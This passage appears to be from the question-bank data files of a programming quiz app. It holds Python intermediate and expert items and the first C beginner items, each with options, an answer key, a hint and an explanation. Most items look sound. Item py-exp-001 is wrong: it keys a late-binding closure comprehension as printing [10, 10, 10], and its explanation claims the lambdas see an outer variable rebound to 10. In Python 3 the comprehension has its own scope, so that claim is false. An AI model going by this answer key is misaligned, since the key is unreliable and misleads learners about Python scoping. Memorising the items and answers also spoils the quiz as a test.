    explanation: "`and` binds tighter than `or`. `'default' and [1, 2]` evaluates to `[1, 2]` because both are truthy. Then `0 or [1, 2]` evaluates to `[1, 2]` because 0 is falsy.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["operators", "short_circuit"]
  },
  {
    id: "py-int-019",
    language: "python",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "oop",
    subtopic: "class_vs_instance_vars",
    standardVersion: "Python 3.10+",
    prompt: "What is the final state of class variable `count` across two separate instances?",
    code: "class Item:\n    count = 0\n    def __init__(self):\n        Item.count += 1\n\na = Item()\nb = Item()\nprint(Item.count, a.count)",
    options: ["2 2", "2 1", "1 1", "0 2"],
    correctAnswer: "2 2",
    acceptedAnswers: ["2 2"],
    hint: "`Item.count += 1` updates the class-level variable directly, which instances inherit via lookup.",
    explanation: "Each instantiation increments `Item.count` directly. Because neither instance defines an instance-level attribute `self.count`, `a.count` falls back to the class attribute, reading 2 for both.",
    points: 200,
    estimatedSeconds: 45,
    tags: ["oop", "class_variables"]
  },
  {
    id: "py-int-020",
    language: "python",
    difficulty: "intermediate",
    type: "predict_output",
    topic: "iterators",
    subtopic: "enumerate_start",
    standardVersion: "Python 3.10+",
    prompt: "What is printed by passing a custom `start` offset to `enumerate()`?",
    code: "words = ['zero', 'one']\nfor idx, w in enumerate(words, start=10):\n    print(f'{idx}-{w}', end=' ')",
    options: ["10-zero 11-one ", "0-zero 1-one ", "10-one 11-zero ", "IndexError"],
    correctAnswer: "10-zero 11-one ",
    acceptedAnswers: ["10-zero 11-one "],
    hint: "The optional `start` parameter initializes the counter offset without altering sequence indexing.",
    explanation: "`enumerate(words, start=10)` starts indexing from 10, pairing 10 with words[0] ('zero') and 11 with words[1] ('one').",
    points: 200,
    estimatedSeconds: 45,
    tags: ["iterators", "enumerate"]
  },

  // =========================================================================
  // PYTHON EXPERT (20 QUESTIONS: py-exp-001 to py-exp-020)
  // =========================================================================
  {
    id: "py-exp-001",
    language: "python",
    difficulty: "expert",
    type: "predict_output",
    topic: "functions",
    subtopic: "closure_late_binding",
    standardVersion: "Python 3.10+",
    prompt: "What is the exact stdout printed by executing this closure list comprehension?",
    code: "funcs = [lambda: i for i in range(3)]\ni = 10\nprint([f() for f in funcs])",
    options: ["[0, 1, 2]", "[2, 2, 2]", "[10, 10, 10]", "NameError: 'i' is out of scope"],
    correctAnswer: "[10, 10, 10]",
    acceptedAnswers: ["[10, 10, 10]"],
    hint: "Python closures bind variable names dynamically at invocation time, not at function creation time.",
    explanation: "Python closures capture variables by reference (late binding). When the lambdas execute in the second comprehension, `i` has been rebound to 10 in the surrounding scope. Therefore, all three lambdas evaluate `i` as 10.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["closures", "late_binding"]
  },
  {
    id: "py-exp-002",
    language: "python",
    difficulty: "expert",
    type: "predict_output",
    topic: "oop",
    subtopic: "mro_c3_linearization",
    standardVersion: "Python 3.10+",
    prompt: "According to C3 linearization, which class's `ping` method is invoked first in this diamond hierarchy?",
    code: "class A:\n    def ping(self): return 'A'\nclass B(A):\n    def ping(self): return 'B'\nclass C(A):\n    def ping(self): return 'C'\nclass D(B, C):\n    pass\n\nprint(D().ping())",
    options: ["B", "C", "A", "TypeError: Cannot create consistent MRO"],
    correctAnswer: "B",
    acceptedAnswers: ["B"],
    hint: "Python evaluates base classes left-to-right: class D(B, C) checks B before C.",
    explanation: "Python's C3 Linearization produces the Method Resolution Order: `D -> B -> C -> A -> object`. Since `B` overrides `ping`, `D().ping()` resolves directly to `B`.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["mro", "inheritance", "c3"]
  },
  {
    id: "py-exp-003",
    language: "python",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "oop",
    subtopic: "new_vs_init",
    standardVersion: "Python 3.10+",
    prompt: "Why must immutable types (like `tuple` or `int` subclasses) customize `__new__` rather than `__init__`?",
    code: "class PositiveInt(int):\n    def __new__(cls, val):\n        return super().__new__(cls, abs(val))",
    options: [
      "__new__ is the constructor responsible for object creation before immutability locks the object",
      "__init__ is not called for subclasses of built-in types",
      "__new__ executes in C whereas __init__ executes in Python bytecode",
      "__new__ avoids the Global Interpreter Lock"
    ],
    correctAnswer: "__new__ is the constructor responsible for object creation before immutability locks the object",
    acceptedAnswers: ["__new__ is the constructor responsible for object creation before immutability locks the object"],
    hint: "By the time `__init__` is invoked, the instance has already been instantiated in memory.",
    explanation: "`__new__` is the static allocator method responsible for creating and returning a new instance. For immutable objects like `int` or `tuple`, once the object is created its value cannot be altered; thus, transformations must occur in `__new__` before instantiation completes.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["oop", "dunder", "metaprogramming"]
  },
  {
    id: "py-exp-004",
    language: "python",
    difficulty: "expert",
    type: "predict_output",
    topic: "metaprogramming",
    subtopic: "descriptor_protocol",
    standardVersion: "Python 3.10+",
    prompt: "What is the priority difference between a Data Descriptor (defining `__set__`) and an instance `__dict__` entry?",
    code: "class DataDesc:\n    def __get__(self, obj, cls): return 'DESC'\n    def __set__(self, obj, val): pass\n\nclass Owner:\n    attr = DataDesc()\n\no = Owner()\no.__dict__['attr'] = 'DICT'\nprint(o.attr)",
    options: ["DESC", "DICT", "AttributeError", "None"],
    correctAnswer: "DESC",
    acceptedAnswers: ["DESC"],
    hint: "Data descriptors (implementing both __get__ and __set__) take precedence over instance dictionary lookups.",
    explanation: "In Python's attribute lookup resolution order, data descriptors (which define `__set__` or `__delete__`) override entries in `instance.__dict__`. Therefore, `o.attr` delegates to `DataDesc.__get__`, printing 'DESC'.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["descriptors", "metaprogramming"]
  },
  {
    id: "py-exp-005",
    language: "python",
    difficulty: "expert",
    type: "predict_output",
    topic: "oop",
    subtopic: "init_subclass",
    standardVersion: "Python 3.10+",
    prompt: "When does the `__init_subclass__` hook execute?",
    code: "class PluginBase:\n    registered = []\n    def __init_subclass__(cls, **kwargs):\n        super().__init_subclass__(**kwargs)\n        cls.registered.append(cls.__name__)\n\nclass AudioPlugin(PluginBase): pass\nclass VideoPlugin(PluginBase): pass\nprint(PluginBase.registered)",
    options: [
      "['AudioPlugin', 'VideoPlugin']",
      "[]",
      "['PluginBase']",
      "TypeError"
    ],
    correctAnswer: "['AudioPlugin', 'VideoPlugin']",
    acceptedAnswers: ["['AudioPlugin', 'VideoPlugin']"],
    hint: "`__init_subclass__` is called at the moment a subclass of the class is defined.",
    explanation: "Introduced in Python 3.6 (PEP 487), `__init_subclass__` acts as a lightweight alternative to metaclasses, executing immediately when each derived class is created during module loading.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["metaprogramming", "oop"]
  },
  {
    id: "py-exp-006",
    language: "python",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "concurrency",
    subtopic: "gil_architecture",
    standardVersion: "Python 3.10+",
    prompt: "Why does multi-threading with standard `threading.Thread` fail to speed up pure CPU-bound mathematical loops in CPython?",
    code: "def compute():\n    return sum(i * i for i in range(10_000_000))",
    options: [
      "The Global Interpreter Lock (GIL) serializes bytecode execution across native threads",
      "Python threads run as greenlet coroutines on a single OS thread",
      "The memory allocator disables parallel garbage collection",
      "Mathematical functions in Python are thread-locked by the math module"
    ],
    correctAnswer: "The Global Interpreter Lock (GIL) serializes bytecode execution across native threads",
    acceptedAnswers: ["The Global Interpreter Lock (GIL) serializes bytecode execution across native threads"],
    hint: "A mutex in CPython prevents multiple native threads from executing Python bytecode simultaneously.",
    explanation: "In CPython, the GIL (Global Interpreter Lock) ensures memory safety by requiring each thread to hold a global mutex before interpreting bytecode. CPU-bound threads fight for the GIL, incurring context-switch overhead without parallel core utilization.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["gil", "threading", "concurrency"]
  },
  {
    id: "py-exp-007",
    language: "python",
    difficulty: "expert",
    type: "predict_output",
    topic: "generators",
    subtopic: "generator_send",
    standardVersion: "Python 3.10+",
    prompt: "What value must be passed to `.send()` on a freshly created, unstarted generator?",
    code: "def worker():\n    val = yield 'ready'\n    yield val * 10\n\nw = worker()\nfirst = w.send(None)\nsecond = w.send(4)\nprint(first, second)",
    options: ["ready 40", "ready None", "TypeError", "None 40"],
    correctAnswer: "ready 40",
    acceptedAnswers: ["ready 40"],
    hint: "An unstarted generator has not yet paused at a yield expression, so only None is valid on initialization.",
    explanation: "A generator must be primed before receiving data. `w.send(None)` advances execution to the first `yield 'ready'`, emitting 'ready'. Then `w.send(4)` resumes execution assigning `val = 4`, yielding `4 * 10 = 40`.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["generators", "coroutines"]
  },
  {
    id: "py-exp-008",
    language: "python",
    difficulty: "expert",
    type: "predict_output",
    topic: "oop",
    subtopic: "slots_dict_suppression",
    standardVersion: "Python 3.10+",
    prompt: "What happens when attempting to assign a new attribute not declared in `__slots__`?",
    code: "class Point:\n    __slots__ = ('x', 'y')\n    def __init__(self, x, y):\n        self.x = x\n        self.y = y\n\np = Point(1, 2)\np.z = 3",
    options: [
      "AttributeError: 'Point' object has no attribute 'z'",
      "p.z successfully assigned",
      "TypeError: cannot add slot dynamically",
      "p is converted into a dictionary"
    ],
    correctAnswer: "AttributeError: 'Point' object has no attribute 'z'",
    acceptedAnswers: ["AttributeError: 'Point' object has no attribute 'z'"],
    hint: "`__slots__` eliminates the default instance `__dict__` to save memory, restricting allowed attribute names.",
    explanation: "By defining `__slots__`, Python reserves memory only for the specified attributes and omits creating a per-instance `__dict__`. Assigning an undeclared attribute raises `AttributeError`.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["slots", "memory", "oop"]
  },
  {
    id: "py-exp-009",
    language: "python",
    difficulty: "expert",
    type: "predict_output",
    topic: "operators",
    subtopic: "reflected_radd",
    standardVersion: "Python 3.10+",
    prompt: "What fallback dunder method is invoked when the left operand does not support addition with the right operand?",
    code: "class Special:\n    def __init__(self, val):\n        self.val = val\n    def __radd__(self, other):\n        return self.val + other * 10\n\nprint(2 + Special(5))",
    options: ["25", "7", "TypeError", "20"],
    correctAnswer: "25",
    acceptedAnswers: ["25", 25],
    hint: "When int.__add__(2, Special) returns NotImplemented, Python checks Special.__radd__(5, 2).",
    explanation: "Python evaluates `(2).__add__(Special(5))`. Since `int` does not know how to add `Special`, it returns `NotImplemented`. Python then invokes `Special(5).__radd__(2)`, yielding `5 + 2 * 10 = 25`.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["dunder", "operators"]
  },
  {
    id: "py-exp-010",
    language: "python",
    difficulty: "expert",
    type: "find_bug",
    topic: "oop",
    subtopic: "mutable_class_attribute",
    standardVersion: "Python 3.10+",
    prompt: "Identify the line that introduces a shared state defect across all instances by declaring a mutable list at the class level:",
    code: "class TaskQueue:\n    queue = []\n    def __init__(self, name):\n        self.name = name\n    def add(self, item):\n        self.queue.append(item)",
    targetLine: 2,
    correctAnswer: 2,
    acceptedAnswers: [2, "2"],
    hint: "Attributes defined directly in the class body are shared by all instances, causing unintended cross-instance mutation.",
    explanation: "Line 2 initializes `queue = []` as a class attribute. Every instance of `TaskQueue` shares this identical list reference. Line 6 modifies the shared class list instead of an instance-specific collection.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["debugging", "oop", "mutability"]
  },
  {
    id: "py-exp-011",
    language: "python",
    difficulty: "expert",
    type: "find_bug",
    topic: "exceptions",
    subtopic: "suppressing_exceptions_incorrectly",
    standardVersion: "Python 3.10+",
    prompt: "Identify the line in `__exit__` where returning True inadvertently swallows and masks all unexpected runtime exceptions:",
    code: "class SafeRunner:\n    def __enter__(self):\n        return self\n    def __exit__(self, exc_type, exc_val, exc_tb):\n        return True\nwith SafeRunner():\n    raise ValueError('Critical failure')",
    targetLine: 5,
    correctAnswer: 5,
    acceptedAnswers: [5, "5"],
    hint: "Returning a truthy value from `__exit__` instructs Python to completely suppress any active exception.",
    explanation: "Line 5 executes `return True`. In Python's context manager protocol, if `__exit__` returns `True`, Python swallows the exception and suppresses propagation, hiding critical unexpected errors.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["debugging", "context_managers"]
  },
  {
    id: "py-exp-012",
    language: "python",
    difficulty: "expert",
    type: "fill_code",
    topic: "metaprogramming",
    subtopic: "metaclass_declaration",
    standardVersion: "Python 3.10+",
    prompt: "Complete the class definition keyword argument to specify a custom metaclass:",
    code: "class MetaValidator(type):\n    pass\n\nclass DataModel(___BLANK_1___=MetaValidator):\n    pass",
    blankCount: 1,
    options: ["metaclass", "meta", "type", "class_generator"],
    correctAnswer: "metaclass",
    acceptedAnswers: ["metaclass"],
    hint: "In Python 3, a metaclass is declared as a keyword argument in the class inheritance parameter list.",
    explanation: "Python 3 specifies a class's metaclass using the keyword argument `metaclass=MetaValidator` in the class definition header.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["metaclass", "syntax"]
  },
  {
    id: "py-exp-013",
    language: "python",
    difficulty: "expert",
    type: "fill_code",
    topic: "memory",
    subtopic: "weakref",
    standardVersion: "Python 3.10+",
    prompt: "Fill in the module function to create a non-owning weak reference to an object:",
    code: "import weakref\nclass Node:\n    pass\nn = Node()\nref = weakref.___BLANK_1___(n)",
    blankCount: 1,
    options: ["ref", "proxy", "create", "weak"],
    correctAnswer: "ref",
    acceptedAnswers: ["ref"],
    hint: "`weakref.ref(obj)` returns a callable weak reference wrapper.",
    explanation: "`weakref.ref(obj)` creates a weak reference object without incrementing the target's reference count, allowing garbage collection.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["weakref", "memory"]
  },
  {
    id: "py-exp-014",
    language: "python",
    difficulty: "expert",
    type: "code_tracing",
    topic: "generators",
    subtopic: "pipeline_evaluation",
    standardVersion: "Python 3.10+",
    prompt: "Trace the values yielded by this chained generator pipeline:",
    code: "def evens(nums):\n    for n in nums:\n        if n % 2 == 0:\n            yield n\n\ndef squares(nums):\n    for n in nums:\n        yield n * n\n\npipeline = squares(evens(range(6)))\nprint(list(pipeline))",
    options: ["[0, 4, 16]", "[0, 4, 16, 36]", "[4, 16]", "[0, 1, 4, 9, 16, 25]"],
    correctAnswer: "[0, 4, 16]",
    acceptedAnswers: ["[0, 4, 16]"],
    hint: "range(6) produces 0, 1, 2, 3, 4, 5. evens yields 0, 2, 4.",
    explanation: "The `evens` generator receives `range(6)` and yields 0, 2, and 4. The `squares` generator processes each in turn: $0^2=0$, $2^2=4$, $4^2=16$, producing `[0, 4, 16]`.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["generators", "tracing"]
  },
  {
    id: "py-exp-015",
    language: "python",
    difficulty: "expert",
    type: "predict_output",
    topic: "functions",
    subtopic: "lru_cache_mutability",
    standardVersion: "Python 3.10+",
    prompt: "What happens when calling an `@lru_cache` decorated function with an unhashable mutable list?",
    code: "from functools import lru_cache\n\n@lru_cache(maxsize=16)\ndef process(items):\n    return len(items)\n\ntry:\n    process([1, 2, 3])\nexcept Exception as e:\n    print(type(e).__name__)",
    options: ["TypeError", "ValueError", "AttributeError", "3"],
    correctAnswer: "TypeError",
    acceptedAnswers: ["TypeError"],
    hint: "The LRU cache uses a dictionary internally to map argument tuples to cached results.",
    explanation: "Because `functools.lru_cache` keys its internal cache dictionary with the arguments passed, attempting to pass an unhashable mutable object (such as a `list`) raises `TypeError: unhashable type: 'list'`.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["caching", "hashing"]
  },
  {
    id: "py-exp-016",
    language: "python",
    difficulty: "expert",
    type: "predict_output",
    topic: "introspection",
    subtopic: "closure_cells",
    standardVersion: "Python 3.10+",
    prompt: "What internal dunder attribute stores the captured closure cells of a function in Python?",
    code: "def outer(x):\n    def inner():\n        return x\n    return inner\n\nfn = outer(42)\ncell = fn.__closure__[0]\nprint(cell.cell_contents)",
    options: ["42", "<cell object>", "x", "AttributeError"],
    correctAnswer: "42",
    acceptedAnswers: ["42", 42],
    hint: "`__closure__` is a tuple of cell objects, each exposing its stored value via `cell_contents`.",
    explanation: "Python stores free variables bound in closures inside the function's `__closure__` tuple. Each element is a cell object whose current referenced value is accessed via `.cell_contents` (42).",
    points: 300,
    estimatedSeconds: 60,
    tags: ["closures", "introspection"]
  },
  {
    id: "py-exp-017",
    language: "python",
    difficulty: "expert",
    type: "predict_output",
    topic: "asyncio",
    subtopic: "coroutine_nature",
    standardVersion: "Python 3.10+",
    prompt: "What does calling an `async def` function directly without `await` return?",
    code: "async def fetch():\n    return 42\n\nres = fetch()\nprint(type(res).__name__)\nres.close()",
    options: ["coroutine", "int", "Future", "Task"],
    correctAnswer: "coroutine",
    acceptedAnswers: ["coroutine"],
    hint: "Calling an async function does not execute its body immediately; it creates an unawaited coroutine object.",
    explanation: "Invoking an `async def` function creates and returns an unawaited `coroutine` object. The function body is only executed when scheduled on an event loop or awaited.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["asyncio", "coroutines"]
  },
  {
    id: "py-exp-018",
    language: "python",
    difficulty: "expert",
    type: "multiple_choice",
    topic: "memory",
    subtopic: "cyclic_gc",
    standardVersion: "Python 3.10+",
    prompt: "How does Python handle cyclic reference memory deallocation (where object A points to B and B points to A)?",
    code: "a = []\nb = [a]\na.append(b)\ndel a, b",
    options: [
      "The cyclic garbage collector detects unreachable reference islands during generational sweeps",
      "Immediate reference counting deallocates them as soon as del is executed",
      "Cyclic references cause permanent memory leaks in CPython",
      "The operating system reclaims them on function exit"
    ],
    correctAnswer: "The cyclic garbage collector detects unreachable reference islands during generational sweeps",
    acceptedAnswers: ["The cyclic garbage collector detects unreachable reference islands during generational sweeps"],
    hint: "Reference counting alone cannot free cycles where reference counts never drop to zero.",
    explanation: "CPython combines standard reference counting with a generational cyclic garbage collector (`gc` module). The cyclic collector periodically inspects object graphs, identifies isolated clusters of unreachable objects whose reference counts come only from within the cluster, and frees them.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["gc", "memory"]
  },
  {
    id: "py-exp-019",
    language: "python",
    difficulty: "expert",
    type: "predict_output",
    topic: "scoping",
    subtopic: "nonlocal_rebind",
    standardVersion: "Python 3.10+",
    prompt: "What is printed when `nonlocal` rebinds an outer non-global variable?",
    code: "def outer():\n    x = 10\n    def inner():\n        nonlocal x\n        x = 20\n    inner()\n    return x\nprint(outer())",
    options: ["20", "10", "UnboundLocalError", "NameError"],
    correctAnswer: "20",
    acceptedAnswers: ["20", 20],
    hint: "The `nonlocal` statement causes the identifier to refer to previously bound variables in the nearest enclosing scope.",
    explanation: "Without `nonlocal`, `x = 20` inside `inner()` would create a new local variable. The `nonlocal x` keyword explicitly instructs Python to bind to the enclosing `x` in `outer()`, mutating it to 20.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["scoping", "nonlocal"]
  },
  {
    id: "py-exp-020",
    language: "python",
    difficulty: "expert",
    type: "predict_output",
    topic: "introspection",
    subtopic: "dynamic_exec",
    standardVersion: "Python 3.10+",
    prompt: "What is the result of using `getattr` with a default value on an object missing the requested attribute?",
    code: "class Data:\n    pass\n\nd = Data()\nval = getattr(d, 'score', 100)\nprint(val)",
    options: ["100", "None", "AttributeError", "0"],
    correctAnswer: "100",
    acceptedAnswers: ["100", 100],
    hint: "`getattr(object, name[, default])` safely handles missing attributes by returning default.",
    explanation: "When the requested attribute does not exist on the object, `getattr` returns the provided third default argument (100) instead of raising `AttributeError`.",
    points: 300,
    estimatedSeconds: 60,
    tags: ["introspection", "getattr"]
  }
];

/* --- End of data/python-questions.js --- */

/* --- Start of data/c-questions.js --- */
/**
 * SyntaxArena Question Bank — C (C99/C11) (Batch 4)
 * Exactly 60 curated challenges: 20 Beginner, 20 Intermediate, 20 Expert.
 * Standard: ISO/IEC 9899:1999 (C99) & C11
 * Source of truth: docs/QUESTION_SCHEMA.md
 */

var cQuestions = window.cQuestions = [
  // =========================================================================
  // C BEGINNER (20 QUESTIONS: c-beg-001 to c-beg-020)
  // =========================================================================
  {
    id: "c-beg-001",
    language: "c",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "data_types",
    subtopic: "sizeof_char",
    standardVersion: "C99",
    prompt: "According to the ISO C standard, what is the guaranteed value of `sizeof(char)` on any compliant system?",
    code: "size_t sz = sizeof(char);",
    options: ["1", "2", "4", "Implementation-defined"],
    correctAnswer: "1",
    acceptedAnswers: ["1", 1],
    hint: "By definition in the C language specification, the size of char is the fundamental unit of storage.",
    explanation: "Under §6.5.3.4 of the C99 standard, `sizeof(char)`, `sizeof(signed char)`, and `sizeof(unsigned char)` are guaranteed to evaluate to exactly 1 byte on all compliant platforms.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["types", "sizeof", "standards"]
  },
  {
    id: "c-beg-002",
    language: "c",
    difficulty: "beginner",
    type: "predict_output",
    topic: "io",
    subtopic: "printf_format",
    standardVersion: "C99",
    prompt: "What is printed by this printf statement formatting integer and character literals?",
    code: "#include <stdio.h>\nint main(void) {\n    printf(\"%d-%c\", 65, 65);\n    return 0;\n}",
    options: ["65-A", "65-65", "A-A", "65-0"],
    correctAnswer: "65-A",
    acceptedAnswers: ["65-A"],
    hint: "%d formats the integer in base 10, while %c prints the ASCII character representation.",
    explanation: "The format specifier `%d` formats integer 65 as '65'. The specifier `%c` outputs the ASCII character for 65, which is 'A'. The output is '65-A'.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["printf", "io"]
  },
  {
    id: "c-beg-003",
    language: "c",
    difficulty: "beginner",
    type: "predict_output",
    topic: "operators",
    subtopic: "increment_timing",
    standardVersion: "C99",
    prompt: "What are the values of `a` and `b` after evaluating post-increment and pre-increment?",
    code: "#include <stdio.h>\nint main(void) {\n    int x = 5;\n    int a = x++;\n    int b = ++x;\n    printf(\"%d %d\", a, b);\n    return 0;\n}",
    options: ["5 7", "6 7", "5 6", "6 6"],
    correctAnswer: "5 7",
    acceptedAnswers: ["5 7"],
    hint: "Post-increment returns the value before incrementing. Pre-increment increments first, then returns.",
    explanation: "`int a = x++` assigns 5 to `a`, then increments `x` to 6. `int b = ++x` increments `x` from 6 to 7 first, then assigns 7 to `b`. Output is '5 7'.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["operators", "increment"]
  },
  {
    id: "c-beg-004",
    language: "c",
    difficulty: "beginner",
    type: "predict_output",
    topic: "arrays",
    subtopic: "zero_indexing",
    standardVersion: "C99",
    prompt: "What is printed by accessing elements across array indices?",
    code: "#include <stdio.h>\nint main(void) {\n    int nums[4] = {10, 20, 30, 40};\n    printf(\"%d\", nums[1] + nums[3]);\n    return 0;\n}",
    options: ["60", "40", "50", "70"],
    correctAnswer: "60",
    acceptedAnswers: ["60", 60],
    hint: "Array indices in C are zero-based: nums[0]=10, nums[1]=20, nums[2]=30, nums[3]=40.",
    explanation: "`nums[1]` is 20 and `nums[3]` is 40. Their sum is `20 + 40 = 60`.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["arrays", "indexing"]
  },
  {
    id: "c-beg-005",
    language: "c",
    difficulty: "beginner",
    type: "predict_output",
    topic: "strings",
    subtopic: "strlen_vs_sizeof",
    standardVersion: "C99",
    prompt: "What is the difference between `sizeof` and `strlen` for a string literal array?",
    code: "#include <stdio.h>\n#include <string.h>\nint main(void) {\n    char str[] = \"C99\";\n    printf(\"%zu %zu\", sizeof(str), strlen(str));\n    return 0;\n}",
    options: ["4 3", "3 3", "4 4", "8 3"],
    correctAnswer: "4 3",
    acceptedAnswers: ["4 3"],
    hint: "sizeof counts the allocated bytes including the hidden '\\0' terminator. strlen counts characters up to '\\0'.",
    explanation: "\"C99\" contains 3 characters plus the terminating null byte `\\0`, so `sizeof(str)` is 4. `strlen(str)` counts characters preceding the null terminator, which is 3.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["strings", "memory"]
  },
  {
    id: "c-beg-006",
    language: "c",
    difficulty: "beginner",
    type: "predict_output",
    topic: "control_flow",
    subtopic: "switch_fallthrough",
    standardVersion: "C99",
    prompt: "What output is produced by a switch statement without break statements?",
    code: "#include <stdio.h>\nint main(void) {\n    int val = 2;\n    switch(val) {\n        case 1: printf(\"A\");\n        case 2: printf(\"B\");\n        case 3: printf(\"C\");\n        default: printf(\"D\");\n    }\n    return 0;\n}",
    options: ["BCD", "B", "ABCD", "BC"],
    correctAnswer: "BCD",
    acceptedAnswers: ["BCD"],
    hint: "In C, execution falls through to subsequent case blocks until a break statement or closing brace is encountered.",
    explanation: "`val == 2` matches `case 2`, printing 'B'. Because there are no `break` statements, execution cascades into `case 3` ('C') and `default` ('D'), outputting 'BCD'.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["switch", "control_flow"]
  },
  {
    id: "c-beg-007",
    language: "c",
    difficulty: "beginner",
    type: "multiple_choice",
    topic: "functions",
    subtopic: "pass_by_value",
    standardVersion: "C99",
    prompt: "What mechanism does C use for argument passing to functions by default?",
    code: "void modify(int x) { x = 100; }",
    options: [
      "Strictly pass-by-value (copies the argument value)",
      "Pass-by-reference by default",
      "Pass-by-value for primitives, pass-by-reference for structs",
      "Pass-by-name"
    ],
    correctAnswer: "Strictly pass-by-value (copies the argument value)",
    acceptedAnswers: ["Strictly pass-by-value (copies the argument value)"],
    hint: "Modifying parameter x inside modify() has zero effect on the caller's variable.",
    explanation: "C is an exclusively pass-by-value language. Even when passing pointers, the pointer value (the address) is itself copied by value into the function's stack frame.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["functions", "call_stack"]
  },
  {
    id: "c-beg-008",
    language: "c",
    difficulty: "beginner",
    type: "predict_output",
    topic: "operators",
    subtopic: "ternary",
    standardVersion: "C99",
    prompt: "What is printed by evaluating this nested ternary conditional expression?",
    code: "#include <stdio.h>\nint main(void) {\n    int a = 10, b = 20;\n    int m = (a > b) ? a : (b > 15 ? 1 : 0);\n    printf(\"%d\", m);\n    return 0;\n}",
    options: ["1", "0", "10", "20"],
    correctAnswer: "1",
    acceptedAnswers: ["1", 1],
    hint: "a > b is false (10 > 20 is 0), so evaluate the false branch: b > 15.",
    explanation: "`10 > 20` evaluates to false (0), so the ternary branches to `(b > 15 ? 1 : 0)`. Since `20 > 15` is true (1), the expression evaluates to 1.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["ternary", "operators"]
  },
  {
    id: "c-beg-009",
    language: "c",
    difficulty: "beginner",
    type: "predict_output",
    topic: "pointers",
    subtopic: "dereference",
    standardVersion: "C99",
    prompt: "What is printed after dereferencing a pointer to mutate an integer?",
    code: "#include <stdio.h>\nint main(void) {\n    int num = 42;\n    int *ptr = &num;\n    *ptr = 99;\n    printf(\"%d\", num);\n    return 0;\n}",
    options: ["99", "42", "Address of num", "0"],
    correctAnswer: "99",
    acceptedAnswers: ["99", 99],
    hint: "`*ptr = 99` writes directly to the memory address stored in ptr.",
    explanation: "`ptr` holds the memory address of `num`. The dereference operator `*ptr` accesses the memory location of `num`, changing its stored value to 99.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["pointers", "memory"]
  },
  {
    id: "c-beg-010",
    language: "c",
    difficulty: "beginner",
    type: "predict_output",
    topic: "operators",
    subtopic: "logical_short_circuit",
    standardVersion: "C99",
    prompt: "Does the increment on `y` execute in the logical OR expression `(x || ++y)` when `x` is non-zero?",
    code: "#include <stdio.h>\nint main(void) {\n    int x = 1, y = 0;\n    if (x || ++y) {\n        printf(\"%d\", y);\n    }\n    return 0;\n}",
    options: ["0", "1", "2", "Compilation error"],
    correctAnswer: "0",
    acceptedAnswers: ["0", 0],
    hint: "Logical OR (||) short-circuits: if the left operand is non-zero (true), the right operand is never evaluated.",
    explanation: "Because `x == 1` is true, the `||` operator short-circuits immediately. The right-hand expression `++y` is never evaluated, so `y` remains 0.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["operators", "short_circuit"]
  },
  {
    id: "c-beg-011",
    language: "c",
    difficulty: "beginner",
    type: "find_bug",
    topic: "arrays",
    subtopic: "buffer_overrun_loop",
    standardVersion: "C99",
    prompt: "Identify the line containing an off-by-one array access error that reads beyond array bounds:",
    code: "#include <stdio.h>\nint main(void) {\n    int arr[5] = {1, 2, 3, 4, 5};\n    for (int i = 0; i <= 5; i++) {\n        printf(\"%d \", arr[i]);\n    }\n    return 0;\n}",
    targetLine: 5,
    correctAnswer: 5,
    acceptedAnswers: [5, "5"],
    hint: "An array of 5 elements has valid indices 0, 1, 2, 3, and 4. Accessing index 5 is out of bounds.",
    explanation: "Line 4 loops with `i <= 5`. When `i == 5`, line 5 executes `arr[5]`, accessing out-of-bounds memory because valid indices are 0 to 4.",
    points: 100,
    estimatedSeconds: 30,
    tags: ["debugging", "arrays"]
  },
  {
    id: "c-beg-012",
    language: "c",
    difficulty: "beginner",
    type: "find_bug",
    topic: "io",
    subtopic: "scanf_missing_ampersand",
    standardVersion: "C99",
    prompt: "Identify the line with a critical bug where scanf is called without the address-of operator:",
    code: "#include <stdio.h>\nint main(void) {\n    int score = 0;\n    printf(\"Enter score: \");\n    scanf(\"%d\", score);\n    return 0;\n}",
    targetLine: 5,
    correctAnswer: 5,
    acceptedAnswers: [5, "5"],
    hint: "scanf requires a pointer to the memory location where input should be stored, not the raw value.",
    explanation: "Line 5 passes `score` by value (0) instead of its address `&score`. `scanf` interprets 0 as memory address `NULL`, causing an invalid memory write (segmentation fault).",
    points: 100,
    estimatedSeconds: 30,
    tags: ["debugging", "scanf", "pointers"]
  },
  {
    id: "c-beg-013",
    language: "c",
    difficulty: "beginner",
    type: "fill_code",
    topic: "syntax",
    subtopic: "preprocessor_include",
    standardVersion: "C99",
    prompt: "Fill in the standard library header required for `printf` and `scanf`:",
    code: "#include <___BLANK_1___>\nint main(void) {\n    printf(\"Ready\\n\");\n    return 0;\n}",
    blankCount: 1,
    options: ["stdio.h", "stdlib.h", "string.h", "conio.h"],
    correctAnswer: "stdio.h",
    acceptedAnswers: ["stdio.h"],
    hint: "Standard Input Output header in C.",
